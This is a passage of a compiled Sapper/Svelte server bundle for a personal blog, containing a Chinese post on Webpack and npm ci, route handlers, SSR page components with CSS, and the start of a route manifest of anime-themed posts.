var Mod79 = {"title":"Webpack 筆記","slug":"webpack-note","html":"<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://andyyou.github.io/2017/02/17/webpack-2-beginner-guide/\">[譯 + 補充] Webpack 2 學習筆記 | DEVLOG of andyyou</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@cos214159/webpack-%E7%AD%86%E8%A8%98%E6%95%B4%E7%90%86-%E4%B8%80-7fc63bcf1ecb\">Webpack 筆記整理 (一)</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/yusuke_ten/items/a40ec089c55599ce1b3e\">Webpack をシンプルに理解しよう</a></li>\n</ul>\n<h2 id=\"什麼時候不要使用-npm-install\">什麼時候不要使用 npm install</h2>\n<ul>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/jigengineer/items/2b15797b850179cb8be0\">あなたが npm install をしてはいけない時</a></p>\n</li>\n<li><p><code>npm</code> 是 Node.js 的套件管理系統，在開發起初時使用 <code>npm init</code> 指令會在開發環境底下新增 <code>package.json</code> 檔案，將所使用的套件名稱與版本等相關資訊儲存在裡面。</p>\n</li>\n<li><p>每次追加新的 <code>xxx</code> 套件時，執行 <code>npm install xxx --save</code> 就會更新 <code>package.json</code> 裡面的 <code>dependencies</code>，並且新增另一個 <code>package-lock.json</code> 檔案。</p>\n</li>\n<li><p><code>xxx</code> 套件的最新版本為 <code>1.0.0</code> 時，<code>package.json</code> 的 <code>dependencies</code> 會以範圍格式記載 <code>&quot;xxx&quot;: &quot;^1.0.0&quot;</code>，亦即適用以 1 開頭的最新版本檔案，然而若是已經推播最新版本 <code>yyy</code> 含有漏洞亦或問題，直接使用 <code>npm install</code> 會難以重現開發環境</p>\n</li>\n<li><p>雖然 <code>package-lock.json</code> 存有該次建構時的確切版本，但 <code>npm install</code> 會覆寫 <code>package-lock.json</code> 裡的版本紀錄，若是需要以建構環境時的套件版本為主，需改用 <code>npm ci</code>，便會以 <code>package-lock.json</code> 為主要參照來源。</p>\n</li>\n<li><p>想更新 <code>package-lock.json</code> 時則直接使用 <code>npm install</code> 或 <code>npm update</code>。</p>\n</li>\n</ul>\n","date":"2019-07-21T13:37:47.000Z","excerpt":"","printDate":"July 21, 2019","printReadingTime":"1 min read"};

var route_64 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod79
});

var all = [
  Mod0,
  Mod1,
  Mod2,
  Mod3,
  Mod4,
  Mod5,
  Mod6,
  Mod7,
  Mod8,
  Mod9,
  Mod10,
  Mod11,
  Mod12,
  Mod13,
  Mod14,
  Mod15,
  Mod16,
  Mod17,
  Mod18,
  Mod19,
  Mod20,
  Mod21,
  Mod22,
  Mod23,
  Mod24,
  Mod25,
  Mod26,
  Mod27,
  Mod28,
  Mod29,
  Mod30,
  Mod31,
  Mod32,
  Mod33,
  Mod34,
  Mod35,
  Mod36,
  Mod37,
  Mod38,
  Mod39,
  Mod40,
  Mod41,
  Mod42,
  Mod43,
  Mod44,
  Mod45,
  Mod46,
  Mod47,
  Mod48,
  Mod49,
  Mod50,
  Mod51,
  Mod52,
  Mod53,
  Mod54,
  Mod55,
  Mod56,
  Mod57,
  Mod58,
  Mod59,
  Mod60,
  Mod61,
  Mod62,
  Mod63,
  Mod64,
  Mod65,
  Mod66,
  Mod67,
  Mod68,
  Mod69,
  Mod70,
  Mod71,
  Mod72,
  Mod73,
  Mod74,
  Mod75,
  Mod76,
  Mod77,
  Mod78,
  Mod79
];

var posts = all
  .map((post) => ({ ...post, html: post.html.replace(/^\t{3}/gm, '') }))
  .sort((a, b) => new Date(b.date) - new Date(a.date));

const contents = JSON.stringify(posts.map(post => {
  return {
    title: post.title,
    slug: post.slug,
    excerpt: post.excerpt,
    printDate: post.printDate,
  };
}));

function get(req, res) {
  res.writeHead(200, {
    'Content-Type': 'application/json'
  });

  res.end(contents);
}

var route_0 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  get: get
});

const lookup = new Map();
posts.forEach(post => {
	lookup.set(post.slug, JSON.stringify(post));
});

function get$1(req, res, next) {
	// the `slug` parameter is available because
	// this file is called [slug].json.js
	const { slug } = req.params;

	if (lookup.has(slug)) {
		res.writeHead(200, {
			'Content-Type': 'application/json'
		});

		res.end(lookup.get(slug));
	} else {
		res.writeHead(404, {
			'Content-Type': 'application/json'
		});

		res.end(JSON.stringify({
			message: `Not found`
		}));
	}
}

var route_81 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  get: get$1
});

function noop() { }
function run(fn) {
    return fn();
}
function blank_object() {
    return Object.create(null);
}
function run_all(fns) {
    fns.forEach(run);
}
function safe_not_equal(a, b) {
    return a != a ? b == b : a !== b || ((a && typeof a === 'object') || typeof a === 'function');
}

let current_component;
function set_current_component(component) {
    current_component = component;
}
function get_current_component() {
    if (!current_component)
        throw new Error(`Function called outside component initialization`);
    return current_component;
}
function afterUpdate(fn) {
    get_current_component().$$.after_render.push(fn);
}
function setContext(key, context) {
    get_current_component().$$.context.set(key, context);
}
const escaped = {
    '"': '&quot;',
    "'": '&#39;',
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;'
};
function escape(html) {
    return String(html).replace(/["'&<>]/g, match => escaped[match]);
}
function each(items, fn) {
    let str = '';
    for (let i = 0; i < items.length; i += 1) {
        str += fn(items[i], i);
    }
    return str;
}
const missing_component = {
    $$render: () => ''
};
function validate_component(component, name) {
    if (!component || !component.$$render) {
        if (name === 'svelte:component')
            name += ' this={...}';
        throw new Error(`<${name}> is not a valid SSR component. You may need to review your build config to ensure that dependencies are compiled, rather than imported as pre-compiled modules`);
    }
    return component;
}
let on_destroy;
function create_ssr_component(fn) {
    function $$render(result, props, bindings, slots) {
        const parent_component = current_component;
        const $$ = {
            on_destroy,
            context: new Map(parent_component ? parent_component.$$.context : []),
            // these will be immediately discarded
            on_mount: [],
            before_render: [],
            after_render: [],
            callbacks: blank_object()
        };
        set_current_component({ $$ });
        const html = fn(result, props, bindings, slots);
        set_current_component(parent_component);
        return html;
    }
    return {
        render: (props = {}, options = {}) => {
            on_destroy = [];
            const result = { head: '', css: new Set() };
            const html = $$render(result, props, {}, options);
            run_all(on_destroy);
            return {
                html,
                css: {
                    code: Array.from(result.css).map(css => css.code).join('\n'),
                    map: null // TODO
                },
                head: result.head
            };
        },
        $$render
    };
}

/* src/routes/index.svelte generated by Svelte v3.4.4 */

function preload({ params, query }) {
  return this.fetch(`index.json`)
    .then((r) => r.json())
    .then((posts) => {
      return { posts };
    });
}

const Index = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	let { posts } = $$props;

  const years = [];
  posts.forEach((post, index) => {
    let currentYear = new Date(post.printDate).getFullYear();
    if (index == 0) {
      years.push(currentYear);
    } else {
      if (currentYear != new Date(posts[index - 1].printDate).getFullYear()) {
        years.push(currentYear);
      }
    }
  });

	if ($$props.posts === void 0 && $$bindings.posts && posts !== void 0) $$bindings.posts(posts);

	return `${($$result.head += `<title>Blog</title>`, "")}

	<div class="container">
	  <h1>Articles</h1>
	  ${each(years, (year) => `<h2>${escape(year)}</h2>
	    <ul>
	      ${each(posts.filter((p) => new Date(p.printDate).getFullYear() == year), (post) => `<li><a rel="prefetch"${(v => v == null ? "" : ` href="${escape(post.slug)}"`)(post.slug)}>${escape(post.title)}</a></li>`)}
	    </ul>`)}
	</div>`;
});

/* src/routes/about.svelte generated by Svelte v3.4.4 */

const About = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	return `${($$result.head += `<title>About</title>`, "")}

	<div class="container">
	  <h1>About</h1>
	  <p>
	    「願意聽別人說話的人並不多。每個人都只想說話，而說的話又不是什麼有內容的話。我也是其中之一。」
	  </p>
	  <p>「該說的話都已經被說過，但是因為沒人在聽，所以還得全都再說一遍。」</p>
	</div>`;
});

/* src/routes/[slug].svelte generated by Svelte v3.4.4 */

const css = {
	code: "header.svelte-1yfmhmu{margin:0 auto;max-width:45em;width:100%;text-align:left}header.svelte-1yfmhmu h1.svelte-1yfmhmu{margin:0}header.svelte-1yfmhmu p.svelte-1yfmhmu{color:#aaa;text-transform:uppercase;font-family:Myrica, sans-serif;font-weight:600}",
	map: "{\"version\":3,\"file\":\"[slug].svelte\",\"sources\":[\"[slug].svelte\"],\"sourcesContent\":[\"<script context=\\\"module\\\">\\n  export async function preload({ params, query }) {\\n    // the `slug` parameter is available because\\n    // this file is called [slug].html\\n    const res = await this.fetch(`${params.slug}.json`);\\n    const data = await res.json();\\n\\n    if (res.status === 200) {\\n      return { post: data };\\n    } else {\\n      this.error(res.status, data.message);\\n    }\\n  }\\n</script>\\n\\n<script>\\n  export let post;\\n</script>\\n\\n<style>\\n  header {\\n    margin: 0 auto;\\n    max-width: 45em;\\n    width: 100%;\\n    text-align: left;\\n  }\\n\\n  header h1 {\\n    margin: 0;\\n  }\\n\\n  header p {\\n    color: #aaa;\\n    text-transform: uppercase;\\n    font-family: Myrica, sans-serif;\\n    font-weight: 600;\\n  }\\n</style>\\n\\n<svelte:head>\\n  <title>{post.title}</title>\\n  <!--  Include canonical links to your blog -->\\n  <!--   <link rel=\\\"canonical\\\" href=\\\"\\\" /> -->\\n\\n  <!-- Validate your twitter card with https://cards-dev.twitter.com/validator  -->\\n  <!-- Update content properties with your URL   -->\\n  <!-- \\t<meta property=\\\"og:url\\\" content=\\\"\\\"} /> -->\\n  <meta property=\\\"og:type\\\" content=\\\"article\\\" />\\n  <meta property=\\\"og:title\\\" content={post.title} />\\n  <meta name=\\\"Description\\\" content={post.excerpt} />\\n  <meta property=\\\"og:description\\\" content={post.excerpt} />\\n\\n  <!--  Link to your preferred image  -->\\n  <!-- \\t<meta property=\\\"og:image\\\" content=\\\"\\\" /> -->\\n\\n  <meta name=\\\"twitter:card\\\" content=\\\"summary_large_image\\\" />\\n\\n  <!--  Link to your Domain  -->\\n  <!-- \\t<meta name=\\\"twitter:domain\\\" value=\\\"\\\" /> -->\\n\\n  <!--  Link to your Twitter Account  -->\\n  <!-- \\t<meta name=\\\"twitter:creator\\\" value=\\\"\\\" /> -->\\n\\n  <meta name=\\\"twitter:title\\\" value={post.title} />\\n  <meta name=\\\"twitter:description\\\" content={post.excerpt} />\\n\\n  <!--  Link to your preferred image to be displayed on Twitter (832x520px) -->\\n  <!-- \\t<meta name=\\\"twitter:image\\\" content=\\\"\\\" /> -->\\n\\n  <meta name=\\\"twitter:label1\\\" value=\\\"Published on\\\" />\\n  <meta\\n    name=\\\"twitter:data1\\\"\\n    value={new Date(post.printDate).toLocaleDateString(undefined, {\\n      year: 'numeric',\\n      month: 'short',\\n      day: 'numeric',\\n    })} />\\n</svelte:head>\\n\\n<header>\\n  <h1>{post.title}</h1>\\n  <p>{post.printDate}</p>\\n</header>\\n<div class=\\\"container\\\">\\n  <article class=\\\"content\\\">\\n    {@html post.html}\\n  </article>\\n</div>\\n\"],\"names\":[],\"mappings\":\"AAoBE,MAAM,eAAC,CAAC,AACN,MAAM,CAAE,CAAC,CAAC,IAAI,CACd,SAAS,CAAE,IAAI,CACf,KAAK,CAAE,IAAI,CACX,UAAU,CAAE,IAAI,AAClB,CAAC,AAED,qBAAM,CAAC,EAAE,eAAC,CAAC,AACT,MAAM,CAAE,CAAC,AACX,CAAC,AAED,qBAAM,CAAC,CAAC,eAAC,CAAC,AACR,KAAK,CAAE,IAAI,CACX,cAAc,CAAE,SAAS,CACzB,WAAW,CAAE,MAAM,CAAC,CAAC,UAAU,CAC/B,WAAW,CAAE,GAAG,AAClB,CAAC\"}"
};

async function preload$1({ params, query }) {
  // the `slug` parameter is available because
  // this file is called [slug].html
  const res = await this.fetch(`${params.slug}.json`);
  const data = await res.json();

  if (res.status === 200) {
    return { post: data };
  } else {
    this.error(res.status, data.message);
  }
}

const Slug = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	let { post } = $$props;

	if ($$props.post === void 0 && $$bindings.post && post !== void 0) $$bindings.post(post);

	$$result.css.add(css);

	return `${($$result.head += `<title>${escape(post.title)}</title><meta property="og:type" content="article"><meta property="og:title"${(v => v == null ? "" : ` content="${escape(post.title)}"`)(post.title)}><meta name="Description"${(v => v == null ? "" : ` content="${escape(post.excerpt)}"`)(post.excerpt)}><meta property="og:description"${(v => v == null ? "" : ` content="${escape(post.excerpt)}"`)(post.excerpt)}><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title"${(v => v == null ? "" : ` value="${escape(post.title)}"`)(post.title)}><meta name="twitter:description"${(v => v == null ? "" : ` content="${escape(post.excerpt)}"`)(post.excerpt)}><meta name="twitter:label1" value="Published on"><meta name="twitter:data1"${(v => v == null ? "" : ` value="${escape(new Date(post.printDate).toLocaleDateString(undefined, {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
    }))}"`)(new Date(post.printDate).toLocaleDateString(undefined, {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
    }))}>`, "")}

	<header class="svelte-1yfmhmu">
	  <h1 class="svelte-1yfmhmu">${escape(post.title)}</h1>
	  <p class="svelte-1yfmhmu">${escape(post.printDate)}</p>
	</header>
	<div class="container">
	  <article class="content">
	    ${post.html}
	  </article>
	</div>`;
});

/* src/components/Logo.svelte generated by Svelte v3.4.4 */

const css$1 = {
	code: "img.svelte-nsstmh{display:block;height:50px;width:50px}",
	map: "{\"version\":3,\"file\":\"Logo.svelte\",\"sources\":[\"Logo.svelte\"],\"sourcesContent\":[\"<style>\\n  img {\\n    display: block;\\n    height: 50px;\\n    width: 50px;\\n  }\\n</style>\\n\\n<a href=\\\"/\\\"> <img alt=\\\"Sapper\\\" src=\\\"logo-192.png\\\" /> </a>\\n\"],\"names\":[],\"mappings\":\"AACE,GAAG,cAAC,CAAC,AACH,OAAO,CAAE,KAAK,CACd,MAAM,CAAE,IAAI,CACZ,KAAK,CAAE,IAAI,AACb,CAAC\"}"
};

const Logo = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	$$result.css.add(css$1);

	return `<a href="/"> <img alt="Sapper" src="logo-192.png" class="svelte-nsstmh"> </a>`;
});

/* src/components/Nav.svelte generated by Svelte v3.4.4 */

const css$2 = {
	code: "nav.svelte-dvivxn{align-items:flex-start;display:flex;flex:1;justify-content:flex-start;text-transform:uppercase}a.svelte-dvivxn{color:inherit;text-decoration:none;padding:10px 5px;display:block;position:relative;margin-left:20px}a.svelte-dvivxn:not(.selected){opacity:0.7}a.svelte-dvivxn::before{content:\"\";position:absolute;transition:transform 0.3s ease;left:0;bottom:0;width:100%;height:2px;background:#aaa;transform:scaleX(0)}a.svelte-dvivxn:hover::before,.selected.svelte-dvivxn::before{transform:scaleX(1)}.selected.svelte-dvivxn::before{background:#fd6378}",
	map: "{\"version\":3,\"file\":\"Nav.svelte\",\"sources\":[\"Nav.svelte\"],\"sourcesContent\":[\"<script>\\n  export let segment;\\n</script>\\n\\n<style>\\n  nav {\\n    align-items: flex-start;\\n    display: flex;\\n    flex: 1;\\n    justify-content: flex-start;\\n    text-transform: uppercase;\\n  }\\n\\n  a {\\n    color: inherit;\\n    text-decoration: none;\\n    padding: 10px 5px;\\n    display: block;\\n    position: relative;\\n    margin-left: 20px;\\n  }\\n\\n  a:not(.selected) {\\n    opacity: 0.7;\\n  }\\n\\n  a::before {\\n    content: \\\"\\\";\\n    position: absolute;\\n    transition: transform 0.3s ease;\\n    left: 0;\\n    bottom: 0;\\n    width: 100%;\\n    height: 2px;\\n    background: #aaa;\\n    transform: scaleX(0);\\n  }\\n\\n  a:hover::before,\\n  .selected::before {\\n    transform: scaleX(1);\\n  }\\n\\n  .selected::before {\\n    background: #fd6378;\\n  }\\n</style>\\n\\n<nav>\\n  <a class={segment === undefined ? 'selected' : ''} href=\\\".\\\">blog</a>\\n  <a class={segment === 'about' ? 'selected' : ''} href=\\\"about\\\">about</a>\\n</nav>\\n\"],\"names\":[],\"mappings\":\"AAKE,GAAG,cAAC,CAAC,AACH,WAAW,CAAE,UAAU,CACvB,OAAO,CAAE,IAAI,CACb,IAAI,CAAE,CAAC,CACP,eAAe,CAAE,UAAU,CAC3B,cAAc,CAAE,SAAS,AAC3B,CAAC,AAED,CAAC,cAAC,CAAC,AACD,KAAK,CAAE,OAAO,CACd,eAAe,CAAE,IAAI,CACrB,OAAO,CAAE,IAAI,CAAC,GAAG,CACjB,OAAO,CAAE,KAAK,CACd,QAAQ,CAAE,QAAQ,CAClB,WAAW,CAAE,IAAI,AACnB,CAAC,AAED,eAAC,KAAK,SAAS,CAAC,AAAC,CAAC,AAChB,OAAO,CAAE,GAAG,AACd,CAAC,AAED,eAAC,QAAQ,AAAC,CAAC,AACT,OAAO,CAAE,EAAE,CACX,QAAQ,CAAE,QAAQ,CAClB,UAAU,CAAE,SAAS,CAAC,IAAI,CAAC,IAAI,CAC/B,IAAI,CAAE,CAAC,CACP,MAAM,CAAE,CAAC,CACT,KAAK,CAAE,IAAI,CACX,MAAM,CAAE,GAAG,CACX,UAAU,CAAE,IAAI,CAChB,SAAS,CAAE,OAAO,CAAC,CAAC,AACtB,CAAC,AAED,eAAC,MAAM,QAAQ,CACf,uBAAS,QAAQ,AAAC,CAAC,AACjB,SAAS,CAAE,OAAO,CAAC,CAAC,AACtB,CAAC,AAED,uBAAS,QAAQ,AAAC,CAAC,AACjB,UAAU,CAAE,OAAO,AACrB,CAAC\"}"
};

const Nav = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	let { segment } = $$props;

	if ($$props.segment === void 0 && $$bindings.segment && segment !== void 0) $$bindings.segment(segment);

	$$result.css.add(css$2);

	return `<nav class="svelte-dvivxn">
	  <a class="${escape(segment === undefined ? 'selected' : '')} svelte-dvivxn" href=".">blog</a>
	  <a class="${escape(segment === 'about' ? 'selected' : '')} svelte-dvivxn" href="about">about</a>
	</nav>`;
});

/* src/components/Header.svelte generated by Svelte v3.4.4 */

const css$3 = {
	code: "header.svelte-310tmg{display:flex;margin:0 auto;max-width:720px;padding:2em 0 0 0;width:100%}",
	map: "{\"version\":3,\"file\":\"Header.svelte\",\"sources\":[\"Header.svelte\"],\"sourcesContent\":[\"<script>\\n  import Logo from \\\"./Logo.svelte\\\";\\n  import Nav from \\\"./Nav.svelte\\\";\\n\\n  export let segment;\\n</script>\\n\\n<style>\\n  header {\\n    display: flex;\\n    margin: 0 auto;\\n    max-width: 720px;\\n    padding: 2em 0 0 0;\\n    width: 100%;\\n  }\\n</style>\\n\\n<header>\\n  <Nav {segment} />\\n  <Logo />\\n</header>\\n\"],\"names\":[],\"mappings\":\"AAQE,MAAM,cAAC,CAAC,AACN,OAAO,CAAE,IAAI,CACb,MAAM,CAAE,CAAC,CAAC,IAAI,CACd,SAAS,CAAE,KAAK,CAChB,OAAO,CAAE,GAAG,CAAC,CAAC,CAAC,CAAC,CAAC,CAAC,CAClB,KAAK,CAAE,IAAI,AACb,CAAC\"}"
};

const Header = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	

  let { segment } = $$props;

	if ($$props.segment === void 0 && $$bindings.segment && segment !== void 0) $$bindings.segment(segment);

	$$result.css.add(css$3);

	return `<header class="svelte-310tmg">
	  ${validate_component(Nav, 'Nav').$$render($$result, { segment: segment }, {}, {})}
	  ${validate_component(Logo, 'Logo').$$render($$result, {}, {}, {})}
	</header>`;
});

/* src/routes/_layout.svelte generated by Svelte v3.4.4 */

const css$4 = {
	code: ".layout.svelte-wjh32h{display:flex;flex-direction:column;min-height:100%;min-height:100vh}main.svelte-wjh32h{position:relative;display:flex;flex:1;flex-direction:column;margin:0 auto;padding:1em 2em;max-width:1400px;width:100%;box-sizing:border-box;background-color:white}footer.svelte-wjh32h{margin:1em auto;padding:1em 2em;max-width:720px;width:100%;font-size:1em;color:#aaa;border-top:1px solid #e6e6e6}",
	map: "{\"version\":3,\"file\":\"_layout.svelte\",\"sources\":[\"_layout.svelte\"],\"sourcesContent\":[\"<script>\\n  import Header from \\\"../components/Header.svelte\\\";\\n\\n  export let segment;\\n</script>\\n\\n<style>\\n  .layout {\\n    display: flex;\\n    flex-direction: column;\\n    min-height: 100%;\\n    min-height: 100vh;\\n  }\\n\\n  main {\\n    position: relative;\\n    display: flex;\\n    flex: 1;\\n    flex-direction: column;\\n    margin: 0 auto;\\n    padding: 1em 2em;\\n    max-width: 1400px;\\n    width: 100%;\\n    box-sizing: border-box;\\n    background-color: white;\\n  }\\n\\n  footer {\\n    margin: 1em auto;\\n    padding: 1em 2em;\\n    max-width: 720px;\\n    width: 100%;\\n    font-size: 1em;\\n    color: #aaa;\\n    border-top: 1px solid #e6e6e6;\\n  }\\n</style>\\n\\n<div class=\\\"layout\\\">\\n  <Header {segment} />\\n\\n  <main>\\n    <slot />\\n  </main>\\n\\n  <footer>\\n    <span>\\n      <a\\n        href=\\\"https://creativecommons.org/licenses/by-sa/4.0/\\\"\\n        target=\\\"_blank\\\"\\n        rel=\\\"noreferrer noopener nofollow\\\">CC BY-SA 4.0.</a>\\n    </span>\\n  </footer>\\n</div>\\n\"],\"names\":[],\"mappings\":\"AAOE,OAAO,cAAC,CAAC,AACP,OAAO,CAAE,IAAI,CACb,cAAc,CAAE,MAAM,CACtB,UAAU,CAAE,IAAI,CAChB,UAAU,CAAE,KAAK,AACnB,CAAC,AAED,IAAI,cAAC,CAAC,AACJ,QAAQ,CAAE,QAAQ,CAClB,OAAO,CAAE,IAAI,CACb,IAAI,CAAE,CAAC,CACP,cAAc,CAAE,MAAM,CACtB,MAAM,CAAE,CAAC,CAAC,IAAI,CACd,OAAO,CAAE,GAAG,CAAC,GAAG,CAChB,SAAS,CAAE,MAAM,CACjB,KAAK,CAAE,IAAI,CACX,UAAU,CAAE,UAAU,CACtB,gBAAgB,CAAE,KAAK,AACzB,CAAC,AAED,MAAM,cAAC,CAAC,AACN,MAAM,CAAE,GAAG,CAAC,IAAI,CAChB,OAAO,CAAE,GAAG,CAAC,GAAG,CAChB,SAAS,CAAE,KAAK,CAChB,KAAK,CAAE,IAAI,CACX,SAAS,CAAE,GAAG,CACd,KAAK,CAAE,IAAI,CACX,UAAU,CAAE,GAAG,CAAC,KAAK,CAAC,OAAO,AAC/B,CAAC\"}"
};

const Layout = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	let { segment } = $$props;

	if ($$props.segment === void 0 && $$bindings.segment && segment !== void 0) $$bindings.segment(segment);

	$$result.css.add(css$4);

	return `<div class="layout svelte-wjh32h">
	  ${validate_component(Header, 'Header').$$render($$result, { segment: segment }, {}, {})}

	  <main class="svelte-wjh32h">
	    ${$$slots.default ? $$slots.default() : ``}
	  </main>

	  <footer class="svelte-wjh32h">
	    <span>
	      <a href="https://creativecommons.org/licenses/by-sa/4.0/" target="_blank" rel="noreferrer noopener nofollow">CC BY-SA 4.0.</a>
	    </span>
	  </footer>
	</div>`;
});

/* src/routes/_error.svelte generated by Svelte v3.4.4 */

const css$5 = {
	code: "h1.svelte-8od9u6,p.svelte-8od9u6{margin:0 auto}h1.svelte-8od9u6{font-size:2.8em;font-weight:700;margin:0 0 0.5em 0}p.svelte-8od9u6{margin:1em auto}@media(min-width: 480px){h1.svelte-8od9u6{font-size:4em}}",
	map: "{\"version\":3,\"file\":\"_error.svelte\",\"sources\":[\"_error.svelte\"],\"sourcesContent\":[\"<script>\\n\\texport let status;\\n\\texport let error;\\n\\n\\tconst dev = undefined === 'development';\\n</script>\\n\\n<style>\\n\\th1, p {\\n\\t\\tmargin: 0 auto;\\n\\t}\\n\\n\\th1 {\\n\\t\\tfont-size: 2.8em;\\n\\t\\tfont-weight: 700;\\n\\t\\tmargin: 0 0 0.5em 0;\\n\\t}\\n\\n\\tp {\\n\\t\\tmargin: 1em auto;\\n\\t}\\n\\n\\t@media (min-width: 480px) {\\n\\t\\th1 {\\n\\t\\t\\tfont-size: 4em;\\n\\t\\t}\\n\\t}\\n</style>\\n\\n<svelte:head>\\n\\t<title>{status}</title>\\n</svelte:head>\\n\\n<h1>{status}</h1>\\n\\n<p>{error.message}</p>\\n\\n{#if dev && error.stack}\\n\\t<pre>{error.stack}</pre>\\n{/if}\\n\"],\"names\":[],\"mappings\":\"AAQC,gBAAE,CAAE,CAAC,cAAC,CAAC,AACN,MAAM,CAAE,CAAC,CAAC,IAAI,AACf,CAAC,AAED,EAAE,cAAC,CAAC,AACH,SAAS,CAAE,KAAK,CAChB,WAAW,CAAE,GAAG,CAChB,MAAM,CAAE,CAAC,CAAC,CAAC,CAAC,KAAK,CAAC,CAAC,AACpB,CAAC,AAED,CAAC,cAAC,CAAC,AACF,MAAM,CAAE,GAAG,CAAC,IAAI,AACjB,CAAC,AAED,MAAM,AAAC,YAAY,KAAK,CAAC,AAAC,CAAC,AAC1B,EAAE,cAAC,CAAC,AACH,SAAS,CAAE,GAAG,AACf,CAAC,AACF,CAAC\"}"
};

const Error$1 = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	let { status, error } = $$props;

	if ($$props.status === void 0 && $$bindings.status && status !== void 0) $$bindings.status(status);
	if ($$props.error === void 0 && $$bindings.error && error !== void 0) $$bindings.error(error);

	$$result.css.add(css$5);

	return `${($$result.head += `<title>${escape(status)}</title>`, "")}

	<h1 class="svelte-8od9u6">${escape(status)}</h1>

	<p class="svelte-8od9u6">${escape(error.message)}</p>

	${  `` }`;
});

// This file is generated by Sapper — do not edit it!

const d = decodeURIComponent;

const manifest = {
	server_routes: [
		{
			// index.json.js
			pattern: /^\/index\.json$/,
			handlers: route_0,
			params: () => ({})
		},

		{
			// posts/ACG-animesama-59-eva-monster-shout-for-love-in-the-center-of-world.md
			pattern: /^\/posts\/ACG-animesama-59-eva-monster-shout-for-love-in-the-center-of-world\/?$/,
			handlers: route_1,
			params: () => ({})
		},

		{
			// posts/ACG-truth-of-living-in-the-city-of-imaginary-patlabor-movie-2.md
			pattern: /^\/posts\/ACG-truth-of-living-in-the-city-of-imaginary-patlabor-movie-2\/?$/,
			handlers: route_2,
			params: () => ({})
		},

		{
			// posts/ACG-does-anno-hideaki-really-dont-know-what-he-is-making.md
			pattern: /^\/posts\/ACG-does-anno-hideaki-really-dont-know-what-he-is-making\/?$/,
			handlers: route_3,
			params: () => ({})
		},

		{
			// posts/ACG-paintaking-of-anime-buble-tragedy-of-musashi-gundoh.md
			pattern: /^\/posts\/ACG-paintaking-of-anime-buble-tragedy-of-musashi-gundoh\/?$/,
			handlers: route_4,
			params: () => ({})
		},

		{
			// posts/ACG-problems-about-taiwan-students-facing-japan-culture.md
			pattern: /^\/posts\/ACG-problems-about-taiwan-students-facing-japan-culture\/?$/,
			handlers: route_5,
			params: () => ({})
		},

		{
			// posts/ACG-does-otaku-culture-really-change-after-earthquake.md
			pattern: /^\/posts\/ACG-does-otaku-culture-really-change-after-earthquake\/?$/,
			handlers: route_6,
			params: () => ({})
		},

		{
			// posts/ACG-creation-and-destroy-of-tokyo-patlabor-movie-1.md
			pattern: /^\/posts\/ACG-creation-and-destroy-of-tokyo-patlabor-movie-1\/?$/,
			handlers: route_7,
			params: () => ({})
		},

		{
			// posts/ACG-message-to-children-under-covid19-from-tomino.md
			pattern: /^\/posts\/ACG-message-to-children-under-covid19-from-tomino\/?$/,
			handlers: route_8,
			params: () => ({})
		},

		{
			// posts/ACG-would-netflix-be-the-saviour-of-anime.md
			pattern: /^\/posts\/ACG-would-netflix-be-the-saviour-of-anime\/?$/,
			handlers: route_9,
			params: () => ({})
		},

		{
			// posts/ACG-difference-of-director-and-producer.md
			pattern: /^\/posts\/ACG-difference-of-director-and-producer\/?$/,
			handlers: route_10,
			params: () => ({})
		},

		{
			// posts/ACG-ghost-of-upbringing-doctrine-otaku.md
			pattern: /^\/posts\/ACG-ghost-of-upbringing-doctrine-otaku\/?$/,
			handlers: route_11,
			params: () => ({})
		},

		{
			// posts/ACG-what-does-anime-describe-after-war.md
			pattern: /^\/posts\/ACG-what-does-anime-describe-after-war\/?$/,
			handlers: route_12,
			params: () => ({})
		},

		{
			// posts/ACG-interview-of-jojo-sakuga-director.md
			pattern: /^\/posts\/ACG-interview-of-jojo-sakuga-director\/?$/,
			handlers: route_13,
			params: () => ({})
		},

		{
			// posts/ACG-our-bible-just-reissue-in-kindle.md
			pattern: /^\/posts\/ACG-our-bible-just-reissue-in-kindle\/?$/,
			handlers: route_14,
			params: () => ({})
		},

		{
			// posts/ACG-tenki-no-ko-is-sekaikei-also-not.md
			pattern: /^\/posts\/ACG-tenki-no-ko-is-sekaikei-also-not\/?$/,
			handlers: route_15,
			params: () => ({})
		},

		{
			// posts/generate-presentation-from-markdown.md
			pattern: /^\/posts\/generate-presentation-from-markdown\/?$/,
			handlers: route_16,
			params: () => ({})
		},

		{
			// posts/ACG-tenki-no-ko-from-child-welfare.md
			pattern: /^\/posts\/ACG-tenki-no-ko-from-child-welfare\/?$/,
			handlers: route_17,
			params: () => ({})
		},

		{
			// posts/ACG-the-influences-of-naoko-yamada.md
			pattern: /^\/posts\/ACG-the-influences-of-naoko-yamada\/?$/,
			handlers: route_18,
			params: () => ({})
		},

		{
			// posts/ACG-the-opening-of-shirobako-movie.md
			pattern: /^\/posts\/ACG-the-opening-of-shirobako-movie\/?$/,
			handlers: route_19,
			params: () => ({})
		},

		{
			// posts/ACG-what-does-wall-of-meisaku-mean.md
			pattern: /^\/posts\/ACG-what-does-wall-of-meisaku-mean\/?$/,
			handlers: route_20,
			params: () => ({})
		},

		{
			// posts/how-to-customize-google-form-style.md
			pattern: /^\/posts\/how-to-customize-google-form-style\/?$/,
			handlers: route_21,
			params: () => ({})
		},

		{
			// posts/ACG-animesama-58-eva-end-of-world.md
			pattern: /^\/posts\/ACG-animesama-58-eva-end-of-world\/?$/,
			handlers: route_22,
			params: () => ({})
		},

		{
			// posts/ACG-expression-of-light-and-heavy.md
